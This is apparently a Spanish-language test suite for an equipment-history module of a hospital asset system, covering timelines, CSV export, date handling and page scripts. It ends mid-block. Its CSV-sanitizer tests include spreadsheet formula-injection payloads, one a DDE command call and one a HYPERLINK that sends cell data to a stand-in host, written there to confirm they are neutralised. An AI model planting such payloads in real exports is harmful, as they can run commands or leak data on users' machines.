// Fase 59 · WP-C: historial del equipo (requisito 9). La lista de eventos que comparten
// la línea de tiempo, el CSV y la hoja de vida (src/lib/historial-equipo.ts), y el
// cargador y el CSV contra las migraciones reales (src/lib/historial-equipo-db.ts y
// GET /api/activos/{id}/historial). También los ayudantes de la ficha y la hoja de vida, y los
// scripts de la ficha (src/pages/activos/[id].astro) corridos en jsdom tal como están en la
// página. Sin red ni base real.
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import { createRequire } from 'node:module';
import { build } from 'esbuild';
import { setupConjuntos } from './test-support/conjuntos-app.mjs';

const require = createRequire(import.meta.url);
const { JSDOM, VirtualConsole } = require('jsdom');
const empaquetar = async (entrada) => {
  const out = await build({ entryPoints: [entrada], bundle: true, format: 'esm', platform: 'neutral', write: false, logLevel: 'silent' });
  return import(`data:text/javascript;base64,${Buffer.from(out.outputFiles[0].text).toString('base64')}`);
};
const H = await empaquetar('src/lib/historial-equipo.ts');
const B = await empaquetar('src/lib/biomedico.ts');

let n = 0;
const es = (r, esperado, nota) => { n++; assert.deepEqual(r, esperado, nota); };
const si = (r, nota) => { n++; assert.equal(r, true, nota); };
const no = (r, nota) => { n++; assert.equal(r, false, nota); };

// 1. claveTiempo: una fecha sola es el inicio del día en El Salvador.
es(H.claveTiempo('2026-05-10'), Date.parse('2026-05-10T06:00:00Z'), 'fecha sola = 00:00 de El Salvador');
es(H.claveTiempo('2026-05-11 01:30:00'), Date.parse('2026-05-11T01:30:00Z'), 'marca de SQLite = UTC');
es(H.claveTiempo('2026-05-11T01:30:00.000Z'), Date.parse('2026-05-11T01:30:00Z'), 'ISO con Z');
es(H.claveTiempo('2026-05-10T19:30:00-06:00'), Date.parse('2026-05-11T01:30:00Z'), 'con desfase');
es(H.claveTiempo('x'), 0, 'ilegible = 0');
es(H.claveTiempo(null), 0, 'null = 0');
es(H.claveTiempo('2026-02-30'), 0, 'fecha inválida = 0');

// 2. ordenarEventos: del más nuevo al más viejo y estable.
{
  const ot = { fecha: '2026-05-10 15:00:00', tipo: 'ot_creada', n: 'ot' };
  const cal = { fecha: '2026-05-10', tipo: 'calibracion', n: 'cal' };
  es(H.ordenarEventos([cal, ot]).map((e) => e.n), ['ot', 'cal'], 'la OT de las 09:00 de SV va antes que la calibración del mismo día');
  const a = { fecha: '2026-05-10', n: 'a' }, b = { fecha: '2026-05-10', n: 'b' }, c = { fecha: '2026-05-10 06:00:00', n: 'c' };
  es(H.ordenarEventos([a, b, c]).map((e) => e.n), ['a', 'b', 'c'], 'misma clave: conserva el orden de entrada');
  es(H.ordenarEventos([{ fecha: 'x', n: 'x' }, a]).map((e) => e.n), ['a', 'x'], 'lo ilegible al final');
}

// 3. enPeriodo: por el día de El Salvador.
si(H.enPeriodo('2026-05-11 01:30:00', '2026-05-10', '2026-05-10'), 'las 19:30 del 10 en SV entran en el 10');
no(H.enPeriodo('2026-05-11 06:00:00', '2026-05-10', '2026-05-10'), 'medianoche del 11 en SV ya no');
si(H.enPeriodo('x', null, null), 'sin filtro todo entra');
no(H.enPeriodo('basura', '2026-01-01', null), 'con filtro, lo ilegible no entra');
si(H.enPeriodo('2026-05-10', '2026-05-10', null), 'el día de inicio cuenta');
si(H.enPeriodo('2026-05-10', null, '2026-05-10'), 'el día final cuenta');
no(H.enPeriodo('2026-05-11', null, '2026-05-10'), 'después del final no');

// 4. periodoValido.
es(H.periodoValido('2026-05-10', '2026-05-01'), { desde: null, hasta: null, error: 'La fecha «Desde» es posterior a «Hasta».' }, 'desde después de hasta');
es(H.periodoValido('10/05/2026', null), { desde: null, hasta: null, error: 'La fecha no es válida.' }, 'otro formato');
es(H.periodoValido('', ''), { desde: null, hasta: null, error: null }, 'vacío: sin filtro ni error');
es(H.periodoValido(null, undefined), { desde: null, hasta: null, error: null }, 'null');
es(H.periodoValido('2026-05-01', '2026-05-31'), { desde: '2026-05-01', hasta: '2026-05-31', error: null }, 'período válido');
es(H.periodoValido('2026-02-30', null).error, 'La fecha no es válida.', '30 de febrero');
es(H.textoPeriodo('2026-05-01', '2026-05-31'), 'del 01/05/2026 al 31/05/2026', 'texto del período');
es(H.textoPeriodo('2026-05-01', null), 'desde el 01/05/2026', 'solo desde');
es(H.textoPeriodo(null, null), '', 'sin período');

// 5. celdaSegura: Excel no toma la celda por fórmula.
es(H.celdaSegura('=SUM(A1)'), "'=SUM(A1)", 'igual');
es(H.celdaSegura('+1'), "'+1", 'más');
es(H.celdaSegura('@x'), "'@x", 'arroba');
es(H.celdaSegura('-x'), "'-x", 'guion y letra');
es(H.celdaSegura('-5'), '-5', 'número negativo');
es(H.celdaSegura('texto'), 'texto', 'texto');
es(H.celdaSegura(null), '', 'null');
es(H.celdaSegura('\t=1'), "'\t=1", 'tabulador');
// Revisión: «-» seguido de cifra también puede ser fórmula; solo un número entero queda tal cual.
es(H.celdaSegura("-2+3+cmd|' /C calc'!A0"), "'-2+3+cmd|' /C calc'!A0", 'guion, cifra y operación: es fórmula');
es(H.celdaSegura('-1+HYPERLINK("https://x.invalid/?"&A1)'), `'-1+HYPERLINK("https://x.invalid/?"&A1)`, 'HYPERLINK detrás de un número negativo');
es(H.celdaSegura('-2.5'), '-2.5', 'decimal negativo');
es(H.celdaSegura('-1,5'), '-1,5', 'decimal negativo con coma');
es(H.celdaSegura('- Se cambió el filtro'), "'- Se cambió el filtro", 'guion de viñeta');

// 6. filaCsv: fecha AAAA-MM-DD y hora aparte, en el orden de las columnas.
{
  const cal = { fecha: '2026-05-10', tipo: 'calibracion', subtipo: 'conforme', titulo: 'Calibración: Conforme', detalle: 'd', responsable: null, orden: null, resultado: 'Conforme', incidente: null, link: null, anulado: false };
  const ot = { ...cal, fecha: '2026-05-11 01:30:00', tipo: 'ot_creada', titulo: '=HYPERLINK("x")', orden: 'OT-MB0001', incidente: { numero: null, fecha: '2026-05-12' } };
  const f1 = H.filaCsv(cal, 'BIO-001');
  es([f1.fecha, f1.hora], ['2026-05-10', ''], 'calibración: fecha sola, sin hora');
  const f2 = H.filaCsv(ot, 'BIO-001');
  es([f2.fecha, f2.hora], ['2026-05-10', '19:30'], 'OT de las 19:30 del 10 en SV');
  es(f2.descripcion, "'=HYPERLINK(\"x\")", 'la descripción no se vuelve fórmula');
  es(f2.incidente, 'pendiente (2026-05-12)', 'incidente sin número');
  es(Object.keys(f1), H.COLUMNAS_CSV_HISTORIAL.map((c) => c.key), 'columnas en orden');
  es(H.COLUMNAS_CSV_HISTORIAL.map((c) => c.label), ['Fecha', 'Hora', 'Evento', 'Orden', 'Descripción', 'Detalle', 'Responsable', 'Resultado o estado', 'Incidente (reporte de Calidad)', 'Código del equipo'], 'encabezados');
  es(f1.evento, 'Calibración', 'etiqueta del evento');
}

// 7. quienEjecuto.
es(H.quienEjecuto({ ejecutores: ['Ana', 'Luis'], firmaTecnicoNombre: 'Pedro', asignado: 'Pedro' }), { nombre: 'Ana, Luis', fuente: 'registro' }, 'registro');
es(H.quienEjecuto({ ejecutores: [], firmaTecnicoNombre: 'Ana', asignado: 'Pedro' }), { nombre: 'Ana', fuente: 'firma' }, 'firma');
es(H.quienEjecuto({ ejecutores: [], firmaTecnicoNombre: null, asignado: 'Pedro' }), { nombre: 'Pedro', fuente: 'asignado' }, 'asignado');
es(H.quienEjecuto({ ejecutores: [], firmaTecnicoNombre: ' ', asignado: null }), { nombre: null, fuente: null }, 'nadie');
es(H.quienEjecuto({ ejecutores: ['Ana', 'Ana'], firmaTecnicoNombre: null, asignado: null }).nombre, 'Ana', 'sin repetir');

// 8. textoRepuestos.
es(H.textoRepuestos([{ codigo: 'REP-01', nombre: 'Fusible 10 A', cantidad: 2, unidad: 'unidad' }, { codigo: 'REP-02', nombre: 'Filtro', cantidad: 1, unidad: null }]),
  'REP-01 Fusible 10 A × 2 unidad; REP-02 Filtro × 1', 'dos repuestos');
es(H.textoRepuestos([]), '', 'sin repuestos');

// 9. construirEventos con un caso completo.
const historial = {
  activoId: 7,
  ots: [{
    id: 11, codigo: 'OT-MB0011', titulo: 'No enciende', descripcion: 'Falla al encender', tipo: 'correctivo', tipoLabel: 'Correctivo',
    prioridad: 'alta', estado: 'cerrada', estadoLabel: 'Cerrada', createdAt: '2026-05-11 01:30:00', completadaEn: '2026-05-12 15:00:00',
    verificadoEn: '2026-05-13 15:00:00', cerradoEn: '2026-05-13 15:00:00', trabajosRealizados: 'Cambio de fuente', causaRaiz: 'Fuente quemada',
    solucionAplicada: 'Fuente nueva', verificacionNotas: 'Probado con paciente simulado', horasTrabajadas: 2.5, asignadoId: 3,
    creador: 'Jefa', asignado: 'Pedro', verificador: 'Jefa', cerrador: 'Jefa', ejecutores: ['Ana'], firmaTecnicoNombre: null,
    incidente: { numeroReporte: 'RC-14', fechaNotificacion: '2026-05-11', nota: 'Avisado por teléfono', marcadoPor: 'Jefa' },
  }],
  comentarios: [{ id: 1, ordenId: 11, ordenCodigo: 'OT-MB0011', texto: 'Se pidió la fuente', usuario: 'Pedro', createdAt: '2026-05-11 16:00:00' }],
  repuestos: [{ id: 1, ordenId: 11, ordenCodigo: 'OT-MB0011', codigo: 'REP-01', nombre: 'Fuente', cantidad: 1, unidad: 'unidad', precioUnitario: 40, registradoPor: 'Pedro', createdAt: '2026-05-12 14:00:00' }],
  calibraciones: [{
    id: 5, fechaCalibracion: '2026-05-10', proximaCalibracion: null, resultado: 'no_conforme', laboratorio: 'Metrología SA', laboratorioExterno: false,
    labAcreditado: true, labAcreditacionRef: 'OSA', numeroCertificado: 'C-1', tieneCertificado: false, patron: { id: 9, codigo: 'PAT-1', nombre: 'Analizador', serial: 'S9' },
    patronVigente: false, patronHasta: '2026-01-01', patronReferencia: null, incertidumbre: '±1 %', realizadoPor: 'Ing. Ruiz', notas: 'Fuera de tolerancia',
    registradoPor: 'Jefa', createdAt: '2026-05-10 20:00:00', corregidaEn: null, corregidaPor: null,
  }],
  documentos: [{ id: 3, nombre: 'manual.pdf', categoria: 'manual_operacion', version: '2', fechaVersion: '2025-01-01', fechaVencimiento: null, nota: null, tamano: 2048, subidoPor: 'Jefa', createdAt: '2026-04-01 12:00:00' }],
  alertas: [{ id: 4, tipo: 'retiro', fuente: 'fabricante', titulo: 'Retiro de baterías', referencia: 'FSN-1', fechaAlerta: '2026-03-01', estado: 'cerrada', aplicabilidad: 'aplica', accionTomada: 'Baterías cambiadas', fechaCierre: '2026-03-10', cerradaEn: '2026-03-10 18:00:00', cerradaPor: 'Jefa' }],
  capacitaciones: [{ id: 6, fecha: '2026-02-01', tema: 'Uso del monitor', tipo: 'uso_seguro', instructorNombre: 'Ana', instructorEntidad: null, asistentes: 12, listaFirmada: true, registradoPor: 'Jefa' }],
  pruebasSE: [{ id: 8, fecha: '2026-01-15', tipo: 'periodica', resultado: 'pasa', estado: 'valida', analizadorDescripcion: 'Fluke ESA615', analizadorSerie: 'F1', realizadoPor: 'Pedro', empresaExterna: null, proximaFecha: '2027-01-15', tieneInforme: true, motivoAnulacion: null, anuladaEn: null, ordenId: null, registradoPor: 'Pedro' }],
  bajas: [{ id: 2, estado: 'vigente', fechaBaja: '2026-06-01', motivo: 'obsolescencia', motivoDetalle: 'Sin repuestos', evaluacionTecnica: 'No reparable', evaluadoPor: 'Ing.', autorizaNombre: 'Director', autorizaCargo: 'Dirección', destinoFinal: 'donacion', destinoDetalle: 'Clínica X', registradoPorNombre: 'Jefa', createdAt: '2026-06-01 15:00:00', revertidaEn: null, revertidaPorNombre: null, reversionMotivo: null }],
  bitacora: [{ id: 1, createdAt: '2026-01-01 15:00:00', accion: 'update', resumen: 'Modificó Clase de riesgo', usuario: null, cambios: [{ campo: 'claseRiesgo', etiqueta: 'Clase de riesgo', antes: '(vacío)', despues: 'IIb' }] }],
};
{
  const ev = H.construirEventos(historial);
  es(ev.length, 14, '14 eventos: OT creada, completada, cerrada e incidente, comentario, repuesto, calibración, documento, alerta y su cierre, capacitación, prueba, baja y bitácora');
  const cal = ev.find((e) => e.tipo === 'calibracion');
  es(cal.resultado, 'No conforme', 'calibración no conforme');
  es(cal.link, null, 'sin archivo no hay enlace');
  si(cal.detalle.includes('sin calibración vigente en esa fecha'), 'patrón no vigente en la fecha');
  si(cal.detalle.includes('Laboratorio: Metrología SA (acreditado)'), 'acreditación del laboratorio');
  const cierre = ev.find((e) => e.tipo === 'alerta_cerrada');
  es(cierre.detalle, 'Acción tomada: Baterías cambiadas', 'la alerta cerrada lleva la acción tomada');
  es(cierre.fecha, '2026-03-10', 'cierre con la fecha declarada');
  es(ev.find((e) => e.tipo === 'alerta').link, '/alertas/4', 'la alerta abre su hoja');
  const creada = ev.find((e) => e.tipo === 'ot_creada');
  es(creada.incidente, { numero: 'RC-14', fecha: '2026-05-11' }, 'la OT lleva la marca de incidente');
  es(ev.find((e) => e.tipo === 'comentario').incidente, { numero: 'RC-14', fecha: '2026-05-11' }, 'y sus comentarios también');
  es(ev.find((e) => e.tipo === 'incidente').link, '/incidentes?activo=7', 'el incidente enlaza a Incidentes del equipo');
  es(ev.find((e) => e.tipo === 'ot_completada').responsable, 'Ana', 'completada: quien ejecutó');
  es(ev.find((e) => e.tipo === 'ot_cerrada').responsable, 'Jefa', 'cerrada: quien verificó');
  es(ev.find((e) => e.tipo === 'baja').link, '/activos/7/acta-baja?baja=2', 'la baja enlaza a su acta');
  si(ev.find((e) => e.tipo === 'baja').titulo.includes('BAJA-0002'), 'folio del acta');
  es(ev.find((e) => e.tipo === 'bitacora').detalle, 'Clase de riesgo: (vacío) → IIb', 'cambios de la bitácora');
  es(ev.find((e) => e.tipo === 'bitacora').responsable, 'Sistema', 'bitácora sin usuario');
  es(ev.find((e) => e.tipo === 'seguridad_electrica').resultado, 'Pasa', 'prueba eléctrica');
  si(ev.find((e) => e.tipo === 'documento').detalle.startsWith('Manual de operación'), 'categoría del documento');
  // Fechas dentro de los textos: DD/MM/AAAA en pantalla y AAAA-MM-DD en el CSV.
  si(ev.find((e) => e.tipo === 'seguridad_electrica').detalle.includes('Próxima: 15/01/2027'), 'pantalla DD/MM/AAAA');
  si(H.construirEventos(historial, { fecha: H.fechaCsv }).find((e) => e.tipo === 'seguridad_electrica').detalle.includes('Próxima: 2027-01-15'), 'CSV AAAA-MM-DD');
  // Una baja revertida y una prueba anulada.
  const otro = { ...historial, ots: [], comentarios: [], repuestos: [],
    bajas: [{ ...historial.bajas[0], estado: 'revertida', revertidaEn: '2026-06-05 15:00:00', revertidaPorNombre: 'Jefa', reversionMotivo: 'Se registró por error' }],
    pruebasSE: [{ ...historial.pruebasSE[0], estado: 'anulada', motivoAnulacion: 'Equipo equivocado' }] };
  const ev2 = H.construirEventos(otro);
  es(ev2.filter((e) => e.tipo.startsWith('baja')).map((e) => e.tipo), ['baja', 'baja_revertida'], 'baja y su reversión');
  // Revisión: /activos/{id}/baja es solo de admin y jefe; el técnico y el visualizador volvían a la ficha.
  es(ev2.find((e) => e.tipo === 'baja_revertida').link, '/activos/7/acta-baja?baja=2', 'la reversión abre el acta, que marca «BAJA REVERTIDA»');
  const anulada = ev2.find((e) => e.tipo === 'seguridad_electrica');
  es([anulada.resultado, anulada.anulado], ['Anulada', true], 'prueba anulada');
  // Orden completo de la línea de tiempo.
  es(H.ordenarEventos(ev).slice(0, 3).map((e) => e.tipo), ['baja', 'ot_cerrada', 'ot_completada'], 'lo más nuevo primero');
}

// 9b. Revisión: una capacitación con fecha futura está programada; no se cuenta como hecha
// ni «sin lista firmada» (la sesión todavía no ocurre).
{
  const hecha = historial.capacitaciones[0];
  const futura = { ...hecha, id: 9, fecha: '2026-12-01', listaFirmada: false, asistentes: 0 };
  const evs = H.construirEventos({ ...historial, capacitaciones: [hecha, futura] }, { hoy: '2026-11-12' });
  const dePrueba = (f) => evs.find((e) => e.tipo === 'capacitacion' && e.fecha === f);
  es([dePrueba('2026-12-01').titulo, dePrueba('2026-12-01').resultado], ['Capacitación programada: Uso del monitor', 'Programada'], 'fecha futura: programada');
  no(dePrueba('2026-12-01').detalle.includes('lista firmada'), 'una programada no dice nada de la lista firmada');
  es([dePrueba('2026-02-01').titulo, dePrueba('2026-02-01').resultado], ['Capacitación: Uso del monitor', null], 'la ya hecha, igual que antes');
  si(dePrueba('2026-02-01').detalle.includes('lista firmada adjunta'), 'la hecha conserva su evidencia');
  es(H.construirEventos({ ...historial, capacitaciones: [{ ...futura, fecha: '2026-11-12' }] }, { hoy: '2026-11-12' }).find((e) => e.tipo === 'capacitacion').resultado, null, 'la de hoy ya cuenta como hecha');
}

// 10. Etiquetas y colores para todos los tipos.
es(H.TIPOS_EVENTO.length, 15, 'quince tipos de evento');
for (const t of H.TIPOS_EVENTO) { n++; assert.ok(H.TIPO_EVENTO_LABEL[t], `etiqueta de ${t}`); assert.match(H.colorEvento({ tipo: t, subtipo: null }), /^border-/); }
es(H.colorEvento({ tipo: 'calibracion', subtipo: 'no_conforme' }), 'border-red-500', 'no conforme en rojo');
es(H.colorEvento({ tipo: 'ot_creada', subtipo: 'preventivo' }), 'border-emerald-400', 'preventivo en verde');

// 11. Hoja de vida: resumen, período y tope de órdenes.
es(H.resumenOts([{ tipo: 'correctivo', estado: 'cerrada' }, { tipo: 'emergencia', estado: 'abierta' }, { tipo: 'preventivo', estado: 'completada' }]),
  { total: 3, concluidas: 2, correctivas: 1, emergencias: 1 }, 'resumen de intervenciones');
{
  const ots = [{ id: 1, createdAt: '2026-05-09 12:00:00' }, { id: 2, createdAt: '2026-05-11 01:30:00' }, { id: 3, createdAt: '2026-05-11 12:00:00' }];
  es(H.otsDelPeriodo(ots, '2026-05-10', '2026-05-10'), { filas: [ots[1]], total: 1, recortado: false }, 'creada el 10 en SV');
  es(H.otsDelPeriodo(ots, null, null, 2), { filas: [ots[2], ots[1]], total: 3, recortado: true }, 'tope: las más nuevas');
}
es(H.textoIncidente({ numero: null, fecha: '2026-05-11' }), 'Incidente · reporte de Calidad pendiente · aviso 11/05/2026', 'texto del incidente');
es([true, false, null].map(H.textoLabAcreditado), ['Acreditado', 'No acreditado', 'No consta'], 'copia de la acreditación');

// 12. Revisión · Incidentes (K-G2) solo lo abren admin, jefe y visualizador: al técnico no se le
// da un enlace que lo devuelve al inicio (y de ahí a /campo).
es(['admin', 'jefe', 'visualizador', 'tecnico', 'solicitante', null].map(H.puedeVerIncidentes), [true, true, true, false, false, false], 'roles de Incidentes');
es(H.enlaceEvento('/incidentes?activo=7', 'tecnico'), null, 'técnico: sin enlace a Incidentes');
es(H.enlaceEvento('/incidentes?activo=7', 'visualizador'), '/incidentes?activo=7', 'visualizador: con enlace');
es(H.enlaceEvento('/ordenes/11', 'tecnico'), '/ordenes/11', 'los demás enlaces no cambian');
es(H.enlaceEvento(null, 'admin'), null, 'evento sin enlace');

// 13. Revisión · tarjeta «Expediente técnico»: un documento vencido que ya se renovó no se anuncia
// como vencido (la cuenta común de biomedico.ts sí lo cuenta: por eso la ficha usa los requisitos).
{
  const c = B.completitudExpediente({
    hoy: '2026-11-12', aceptacionFecha: null,
    documentos: [
      { categoria: 'registro_sanitario', fechaVencimiento: '2025-01-01' },
      { categoria: 'registro_sanitario', fechaVencimiento: '2027-05-01' },
      { categoria: 'manual_operacion', fechaVencimiento: null },
      { categoria: 'manual_servicio', fechaVencimiento: '2026-01-01' },
      { categoria: 'ficha_tecnica', fechaVencimiento: null },
    ],
  });
  es(c.documentosVencidos, 2, 'la cuenta común incluye el registro sanitario ya renovado');
  es(H.lineasExpediente(c), { faltan: ['Acta de instalación o aceptación'], vencidos: ['Manual de mantenimiento o servicio'] },
    'el registro renovado no sale; el manual, que solo tiene una versión vencida, sí');
  es(H.lineasExpediente({ requisitos: [] }), { faltan: [], vencidos: [] }, 'sin requisitos');
}

// 14. Revisión · hoja de vida numerada sin huecos: capacitaciones solo en biomédicos, como su
// componente (WP-D); un equipo reclasificado con capacitaciones dejaba «1, 2, 3, 5. Alertas».
{
  const base = { esBio: false, llevaCal: false, deBaja: false, calibraciones: 0, pruebas: 0, documentos: 0, licencias: 0, alertas: 0, bajas: 0 };
  const general = H.seccionesHojaVida({ ...base, alertas: 1 });
  es(general.num, { ident: 1, planes: 2, ots: 3, alertas: 4 }, 'equipo general con una alerta: 1 a 4');
  no(general.presentes.cap, 'sin sección de capacitaciones fuera de biomédicos');
  es(H.seccionesHojaVida({ ...base, esBio: true, llevaCal: true, alertas: 2, deBaja: true, bajas: 1 }).num,
    { ident: 1, planes: 2, ots: 3, cal: 4, se: 5, docs: 6, lic: 7, cap: 8, alertas: 9, baja: 10 }, 'biomédico con todo');
  es(H.seccionesHojaVida({ ...base, documentos: 2, licencias: 1, calibraciones: 1 }).num, { ident: 1, planes: 2, ots: 3, cal: 4, docs: 5, lic: 6 }, 'otra área con registros');
  es(H.seccionesHojaVida({ ...base, bajas: 1 }).num.baja, 4, 'una baja revertida también tiene su sección');
}

// 15. Revisión · scripts de la ficha tal como están en src/pages/activos/[id].astro, en jsdom.
const fuenteFicha = await fs.readFile('src/pages/activos/[id].astro', 'utf8');
function scriptDeFicha(marca) {
  const i = fuenteFicha.indexOf(marca);
  assert.ok(i >= 0, `la ficha tiene el script de ${marca}`);
  const ini = fuenteFicha.indexOf('}) }}>', i) + '}) }}>'.length;
  return fuenteFicha.slice(ini, fuenteFicha.indexOf('</script>', ini));
}
const pausa = (ms = 0) => new Promise((r) => setTimeout(r, ms));
function correrScript(html, codigo, vars, responder) {
  const enviados = [], avisos = [], recargas = [], errores = [];
  const consola = new VirtualConsole();
  consola.on('jsdomError', (e) => { const m = String(e?.message ?? e); (/navigation/i.test(m) ? recargas : errores).push(m); });
  const dom = new JSDOM(`<!doctype html><html><body>${html}</body></html>`, { url: 'https://test.invalid/activos/1?area=biomedico', runScripts: 'outside-only', virtualConsole: consola });
  const w = dom.window;
  w.alert = (m) => avisos.push(m);
  w.confirm = () => true;
  w.Element.prototype.scrollIntoView = function () {};
  w.fetch = async (url, init = {}) => {
    enviados.push({ ruta: String(url), metodo: init.method ?? 'GET' });
    const r = await responder(String(url), init);
    return new Response(JSON.stringify(r.body ?? {}), { status: r.status, headers: { 'content-type': 'application/json' } });
  };
  // Como Astro con define:vars: el script va dentro de una función con su variable codificada.
  w.eval(`(function(){ const __encodedScriptVars = ${JSON.stringify(encodeURIComponent(JSON.stringify(vars)))};\n${codigo}\n})();`);
  const doc = w.document;
  return { w, doc, enviados, avisos, recargas, errores, $: (id) => doc.getElementById(id), close: () => w.close() };
}

// 15a. Calibración guardada con avisos: «+ Registrar calibración» y «Corregir» recargan. Antes,
// el primer clic solo cerraba el formulario: la tabla seguía sin la calibración nueva y se registraba dos veces.
{
  const html = `
    <button id="calNewBtn" type="button">+ Registrar calibración</button>
    <button type="button" class="cal-fix" data-id="21">Corregir</button>
    <div id="calForm" class="hidden">
      <h3 id="calTitulo"></h3>
      <input id="c_fecha" type="date"><input id="c_proxima" type="date">
      <select id="c_lab"><option value="" data-aviso="">Externo</option><option value="1" data-aviso="Acreditado" data-ok="1">Metrología SA</option></select>
      <p id="c_lab_aviso" class="hidden"></p>
      <input id="c_labext"><input id="c_cert">
      <select id="c_resultado"><option value="conforme">Conforme</option><option value="conforme_con_ajuste">Con ajuste</option><option value="no_conforme">No conforme</option></select>
      <select id="c_patron_id"><option value="">Ninguno</option></select>
      <input id="c_patron"><input id="c_incert"><input id="c_realizado">
      <label id="c_file_label" for="c_file"></label><input id="c_file" type="file">
      <textarea id="c_notas"></textarea>
      <div id="c_motivo_wrap" class="hidden"><textarea id="c_motivo"></textarea></div>
      <p id="c_msg" class="hidden"></p>
      <div id="c_avisos" class="hidden"><ul id="c_avisos_lista"></ul><button id="c_avisos_ok" type="button">Entendido</button></div>
      <button id="c_save" type="button">Guardar calibración</button><button id="c_cancel" type="button">Cancelar</button>
    </div>`;
  const calibraciones = [{ id: 21, fechaCalibracion: '2026-05-10', fechaTexto: '10/05/2026', proximaCalibracion: '2027-05-10', laboratorioId: 1, labNombre: 'Metrología SA',
    laboratorioExterno: null, numeroCertificado: 'C-77', patronActivoId: null, patronEtiqueta: null, patronReferencia: null, resultado: 'conforme',
    incertidumbre: null, realizadoPor: null, notas: null, tieneCertificado: true }];
  const p = correrScript(html, scriptDeFicha('calibraciones: calibracionesJs'), { activoId: 1, hoy: '2026-11-12', maxBytes: 15 * 1024 * 1024, calibraciones },
    () => ({ status: 201, body: { advertencias: ['El patrón PAT-1 no tenía calibración vigente el 12/11/2026.'] } }));
  p.$('calNewBtn').click();
  es([p.$('calForm').classList.contains('hidden'), p.$('c_fecha').value, p.$('c_proxima').value], [false, '2026-11-12', '2027-11-12'], 'abre con hoy y la próxima a un año');
  p.$('c_lab').value = '1';
  p.$('c_save').click();
  await pausa(10);
  es(p.enviados.map((e) => `${e.metodo} ${e.ruta}`), ['POST /api/activos/1/calibraciones'], 'se guardó una vez');
  es([p.$('c_avisos').classList.contains('hidden'), p.$('c_avisos_lista').textContent, p.recargas.length], [false, 'El patrón PAT-1 no tenía calibración vigente el 12/11/2026.', 0], 'los avisos se leen antes de recargar');
  p.$('calNewBtn').click();
  es(p.recargas.length, 1, '«+ Registrar calibración» después de guardar recarga la página');
  no(p.$('calForm').classList.contains('hidden'), 'y no cierra el formulario como si nada');
  p.doc.querySelector('.cal-fix').click();
  es(p.recargas.length, 2, '«Corregir» después de guardar también recarga (sus datos ya cambiaron)');
  es([p.errores, p.enviados.length], [[], 1], 'sin errores ni envíos de más');
  p.close();
}

// 15b. Guardar una rutina: un solo envío aunque se haga doble clic, y aviso si no hay conexión.
{
  const html = `
    <div id="newPlanForm">
      <input id="p_titulo" value="Mantenimiento preventivo Monitor"><textarea id="p_descripcion"></textarea>
      <select id="p_frecuencia"><option value="mensual" selected>Mensual</option></select>
      <input id="p_proxima" type="date" value="2026-11-12"><input id="p_alerta" type="number" value="7">
      <select id="p_prioridad"><option value="media" selected>Media</option></select>
      <input id="p_horas" type="number"><select id="p_asignado"><option value="" selected>Sin asignar</option></select>
      <textarea id="p_checklist"></textarea>
      <p id="p_err" class="hidden"></p>
      <button id="p_save" type="button">Guardar plan</button>
    </div>`;
  const vars = { activoId: 1, activoCodigo: 'BIO-001', activoNombre: 'Monitor', ubicacionNombre: null, hoy: '2026-11-12' };
  let soltar;
  const p = correrScript(html, scriptDeFicha('activoId: id, activoCodigo'), vars, () => new Promise((r) => { soltar = () => r({ status: 201, body: { plan: { id: 1 } } }); }));
  p.$('p_save').click();
  p.$('p_save').click();
  await pausa(10);
  es(p.enviados.filter((e) => e.metodo === 'POST').length, 1, 'doble clic: una sola rutina');
  si(p.$('p_save').disabled, 'el botón queda deshabilitado mientras se guarda');
  soltar();
  await pausa(10);
  es([p.recargas.length, p.errores], [1, []], 'guardada: recarga');
  p.close();
  const sinRed = correrScript(html, scriptDeFicha('activoId: id, activoCodigo'), vars, () => { throw new TypeError('Failed to fetch'); });
  sinRed.$('p_save').click();
  await pausa(10);
  es([sinRed.$('p_err').textContent, sinRed.$('p_err').classList.contains('hidden'), sinRed.$('p_save').disabled], ['No hay conexión. Intenta de nuevo.', false, false], 'sin conexión: lo dice y deja reintentar');
  sinRed.close();
  const rechazo = correrScript(html, scriptDeFicha('activoId: id, activoCodigo'), vars, () => ({ status: 400, body: { error: 'Elige una frecuencia de la lista.' } }));
  rechazo.$('p_save').click();
  await pausa(10);
  es([rechazo.$('p_err').textContent, rechazo.$('p_save').disabled], ['Elige una frecuencia de la lista.', false], 'el error de la API, tal cual (K-E1)');
  rechazo.close();
}

// 15c. Inspección de aceptación sin conexión: lo dice en lugar de quedarse callada.
{
  const html = `<button id="acepBtn">Registrar</button><div id="acepModal" class="hidden"><input id="acep_fecha" type="date" value="2026-11-12">
    <select id="acep_resultado"><option value="aprobado" selected>Aprobado</option></select><textarea id="acep_notas"></textarea>
    <p id="acep_err" class="hidden"></p><button id="acep_cancel">Cancelar</button><button id="acep_save">Guardar registro</button></div>`;
  const p = correrScript(html, scriptDeFicha('encodeInlineScriptVars({ activoId: a.id }) }}>'), { activoId: 1 }, () => { throw new TypeError('Failed to fetch'); });
  p.$('acep_save').click();
  await pausa(10);
  es([p.$('acep_err').textContent, p.$('acep_err').classList.contains('hidden'), p.$('acep_save').disabled, p.errores], ['No hay conexión. Intenta de nuevo.', false, false, []], 'aviso sin conexión');
  p.close();
}

// 16. Revisión · lo que la ficha muestra según el rol y el estado (fuente de la página; la versión
// construida se revisó con el contenedor de Astro).
{
  const limpio = fuenteFicha.replace(/\s+/g, ' ');
  si(/const auditRows = verBio \?/.test(limpio), 'la bitácora del equipo solo se consulta para quien ve lo biomédico');
  si(/\{verBio && \( <div class="card mt-6 p-5"> <div class="flex flex-wrap items-center justify-between gap-2"> <h2 class="font-semibold">Historial de cambios<\/h2>/.test(limpio),
    'la tarjeta «Historial de cambios» (calibraciones, documentos, bajas) no se pinta para proveedor, solicitante ni motorista');
  si(limpio.includes('{verBio && a.estado === "baja" && bajaVigente && ( <a href={areaHref(`/activos/${a.id}/acta-baja?baja=${bajaVigente.id}`, area)} class="btn-secondary">Acta de baja</a>'),
    '«Acta de baja» solo con un acta registrada (sin ella, el enlace devolvía a la ficha)');
  no(limpio.includes('Completar datos de baja'), 'sin acta no se promete «completar» lo que la pantalla de baja no deja hacer');
  si(limpio.includes('{a.estado !== "baja" && <button data-id={r.p.id} data-edit'), 'equipo de baja: sin «Editar» rutina (la API responde 409)');
  si(limpio.includes('{(a.estado !== "baja" || r.p.activo) && <button data-id={r.p.id} data-pause'), 'equipo de baja: sin «Activar» rutina');
  si(limpio.includes('{registraBio && isBio && a.estado !== "baja" && <a href={`/activos/${a.id}/seguridad-electrica/nueva`}'), 'registrar prueba eléctrica solo en biomédicos');
